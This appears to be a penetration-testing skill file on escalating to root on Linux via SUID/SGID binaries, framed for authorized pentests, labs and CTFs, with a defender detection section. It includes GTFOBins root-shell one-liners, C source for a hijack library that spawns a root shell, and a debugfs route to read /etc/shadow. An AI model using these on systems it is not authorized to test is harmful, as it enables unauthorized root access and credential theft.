---
name: privesc-linux-vectors-suid-binaries
description: Use when authorized Linux privilege escalation enumeration has
  surfaced SUID or SGID binaries and you need to turn the unusual ones into
  root. Covers full SUID/SGID discovery, filtering standard binaries from
  custom ones, GTFOBins primitive matching, shared library hijacking with
  ldd analysis, SUID shell scripts and why the kernel ignores them, PATH
  abuse inside SUID programs, and verifying the primitive keeps euid 0
  before you commit. For authorized pentests, labs, and CTFs only.
version: 1.0.0
domain: privesc
lifecycle: stable
last_verified: 2026-10-23
requires: [privesc-linux-vectors]
extends: []
parent: privesc-linux-vectors
relates: [privesc-linux, privesc-linux-vectors-sudo-misconfigurations]
tools:
  - name: linpeas
    version: 2.x
  - name: findutils
    version: 4.9
  - name: gcc
    version: 13.2.0
  - name: Python
    version: 3.12
---
SUID binaries run with the file owner's privileges (usually root) no matter who executes them, which makes every nonstandard SUID binary a privilege escalation candidate on an authorized engagement. This sub-skill covers the complete SUID and SGID workflow: discover every privileged binary, filter the standard set down to the interesting outliers, match each outlier against known escalation primitives, and verify the primitive actually yields root before relying on it. Scope is authorized penetration tests, labs, and CTFs only.

## Quick Workflow

1. Enumerate all SUID and SGID binaries with `find`, saving the full list to a file for local review.
2. Subtract the standard set (sudo, su, passwd, mount, ping, and distro defaults) to isolate custom or unusual binaries.
3. For each outlier, check GTFOBins for a known SUID primitive and read what the primitive requires.
4. Inspect the binary for secondary weaknesses: `ldd` for hijackable libraries, `strings` for called commands and paths, writable config files it reads.
5. Test the primitive in a way that proves euid 0 (run `id` through it) before building the full escalation.
6. Exploit, confirm root, capture `id` output and the exact command chain for the report.

## 1. Full discovery and filtering

Collect the complete list first, then filter. Do this once and work from the file.

```bash
find / -perm -4000 -type f 2>/dev/null | sort > /tmp/suid.txt
find / -perm -2000 -type f 2>/dev/null | sort > /tmp/sgid.txt
wc -l /tmp/suid.txt; cat /tmp/suid.txt
```

Example output shape: 20 to 40 lines on a typical server, mostly `/usr/bin/*` entries you recognize. Flag anything outside `/usr/bin` and `/bin`, anything under `/opt`, `/srv`, `/home`, or `/tmp`, and any binary whose name you do not recognize from a default install. LinPEAS highlights these in its SUID section, but always confirm by hand.

```bash
grep -v -E "^/(usr/)?bin/(sudo|su|passwd|chsh|chfn|mount|umount|ping|newgrp|gpasswd|pkexec)$" /tmp/suid.txt
```

## 2. GTFOBins primitive matching

GTFOBins documents which binaries yield shells or file writes when run with elevated privileges. Look up each outlier by exact binary name.

```bash
ls -la /usr/local/bin/backup-tool
file /usr/local/bin/backup-tool
```

Example reasoning: `/usr/bin/find` with SUID gives `find . -exec /bin/sh \; -quit`, which spawns a root shell because find keeps euid. `/usr/bin/vim` with SUID gives `:!/bin/sh`. A custom backup tool with no GTFOBins entry needs manual analysis (section 3), which is where real engagements are won.

Always verify the primitive preserves privilege:

```bash
/usr/bin/find . -exec id \; -quit
```

Example output shape: `uid=1000(app) gid=1000(app) euid=0(root) groups=1000(app)`. The `euid=0(root)` confirms the primitive works. If output shows no euid 0, the binary drops privileges and the primitive is dead.

## 3. Shared library hijacking

SUID binaries that load libraries from writable paths, or fail to find a library, let you inject code that runs as root.

```bash
ldd /usr/local/bin/backup-tool
```

Example output shape:

```
linux-vdso.so.1 (0x00007ffd...)
libcustom.so => not found
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
```

`libcustom.so => not found` is the signal: the loader will search the paths in `LD_LIBRARY_PATH` (usually sanitized for SUID), then the binary's RUNPATH, then `ld.so.cache`, then default directories. Check for a writable RUNPATH with `readelf -d`:

```bash
readelf -d /usr/local/bin/backup-tool | grep -i -E "runpath|rpath|needed"
```

If RUNPATH points to a directory you can write to, compile a hostile library with the missing name and a constructor that spawns a shell:

```c
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void pwn(void) {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
```

```bash
gcc -shared -fPIC -o libcustom.so pwn.c
```

Place it on the RUNPATH and execute the SUID binary. The constructor runs as root before `main`.

## 4. Strings, invoked commands, and config files

Custom SUID binaries often shell out to other programs or read config files. Both are attack surface.

```bash
strings /usr/local/bin/backup-tool | grep -E "^/|system|popen|exec"
```

Example output shape: lines like `/opt/backup.conf`, `/usr/bin/tar`, or `system("tar cf ...")`. If the binary calls `tar` by bare name, PATH hijacking applies (see the cron-and-path-hijacking sub-skill). If it reads `/opt/backup.conf` and that file is writable, you may control its behavior. If it uses `system()` with user-influenced input, command injection follows.

## 5. SGID binaries and group stepping stones

SGID binaries run with the group owner's privileges. They rarely give root directly, but membership in groups like `adm` (log reading), `disk` (raw disk access), `lxd`, or `docker` is often equivalent to root.

```bash
cat /tmp/sgid.txt
id
```

Example output shape: your user in the `disk` group plus an SGID binary owned by `disk` confirms raw block device access, which means reading `/etc/shadow` straight off the disk with `debugfs`. Treat SGID findings as group-membership stepping stones and chain them.

## 6. SUID on scripts is a dead end on Linux

The Linux kernel ignores the SUID bit on interpreted scripts for security. If `find` shows an SUID shell or Python script, the bit does nothing.

```bash
ls -la /opt/runme.sh
file /opt/runme.sh
```

Do not waste time on SUID scripts themselves; instead check whether a privileged binary or cron job executes the script, which moves the attack to that caller. An SUID bit on a script is still worth reporting as a misconfiguration.

## Edge cases

- Binaries compiled with privilege-dropping wrappers call `setuid(getuid())` early; the GTFOBins primitive then runs as your user and `id` shows no euid 0, so always run the `id` verification first.
- `ldd` on a setuid binary can behave differently from the real loader path resolution; confirm hijackability by testing with a harmless constructor that writes a marker file.
- Static binaries have no library attack surface at all; `ldd` reporting "not a dynamic executable" closes section 3 for that binary.
- GTFOBins entries assume standard builds; distro patches or AppArmor profiles can neuter a primitive, so test on the target rather than trusting the documentation alone.
- Capabilities (`getcap`) and SUID are separate mechanisms; a binary can have both, and the capability may be the actual escalation path when the SUID bit is a decoy.
- Container environments may show SUID binaries that are useless without the matching capability set; check `capsh --print` alongside the SUID list.

## Escalation

- If no SUID outlier yields a primitive, pivot to SGID group stepping stones: `disk`, `lxd`, `docker`, `adm`, and `shadow` group memberships each have documented escalation chains.
- When a custom SUID binary has no GTFOBins entry, escalate to binary analysis: `ltrace` and `strace` reveal the files it opens and the commands it runs, which often expose the real weakness.
- If the binary reads a config file you cannot write, check the directory permissions: a writable directory lets you replace the file even when the file itself is read-only.
- When SUID as a class is clean, move to the sibling sub-skills: sudo misconfigurations and cron hijacking are the next highest-yield vector classes.

## Detection and defender view

Defenders detect SUID abuse with file integrity monitoring that alerts on new or changed SUID binaries, auditd rules watching `execve` of known-dangerous SUID paths, and periodic `find / -perm -4000` baselining against a known-good list. Library hijacking leaves traces in the form of new `.so` files in odd directories and unusual `execve` parent-child relationships. From the authorized tester side, prefer primitives that do not write persistent files, and document every binary you touched so the report's remediation section can name exact paths and recommended fixes (remove the SUID bit, move the binary, or replace it with a capability-scoped alternative).

## Key references

- MITRE ATT&CK T1548.001 (Setuid and Setgid)
- GTFOBins: https://gtfobins.github.io (per-binary SUID primitives)
- capabilities manual: https://man7.org/linux/man-pages/man7/capabilities.7.html
- ld.so manual: https://man7.org/linux/man-pages/man8/ld.so.8.html (library search order)
- HackTricks SUID section: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
- ldd and readelf documentation: https://man7.org/linux/man-pages/man1/ldd.1.html
